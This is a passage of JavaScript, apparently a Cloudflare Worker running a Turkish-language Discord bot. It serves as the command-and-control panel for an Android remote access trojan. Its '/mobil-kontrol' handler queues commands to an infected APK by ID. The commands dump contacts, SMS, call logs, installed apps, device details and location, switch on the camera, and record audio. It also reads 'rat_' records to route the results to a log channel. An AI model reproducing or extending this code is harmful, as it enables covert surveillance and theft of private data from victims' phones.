          if (!id) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: APK ID gerekli. /apk-uret ile olusturdugun APK nin IDsi.' }); return; }

          const options = ['rehber', 'sms', 'arama', 'uygulamalar', 'cihaz', 'konum', 'kamera_on', 'ses_kayit', 'hepsi'];
          const optionList = options.join(', ');

          if (!secenek) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `**MOBIL KONTROL**\n\nID: \`${id}\`\n\nSecenekler: ${optionList}\n\nKullanim: /mobil-kontrol id:${id} secenek:rehber\nHepsi: /mobil-kontrol id:${id} secenek:hepsi` });
            return;
          }

          if (!options.includes(secenek)) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Gecersiz secenek: ${secenek}\nGecerli: ${optionList}` });
            return;
          }

          const cmd = JSON.stringify({ cmd: secenek, ts: Date.now() });
          await env.KV.put('cmd_' + id, cmd, { expirationTtl: 300 });

          const chId = interaction.channel_id;
          const ratData = await env.KV.get('rat_' + id);
          let targetCh = chId;
          if (ratData && kanal === 'kanal') {
            const rd = JSON.parse(ratData);
            if (rd.logChannel) targetCh = rd.logChannel;
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: `[MOBIL-KONTROL] \`${secenek}\` komutu APK'ya gonderildi (ID: \`${id}\`). Cihaz cevap verince sonuc bu kanala gelir.` });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
        return sendResponse('Bilinmeyen komut. Bu bot henuz yapilandiriliyor.');
    }
  }

  return new Response('Bilinmeyen etkilesim', { status: 400 });
}
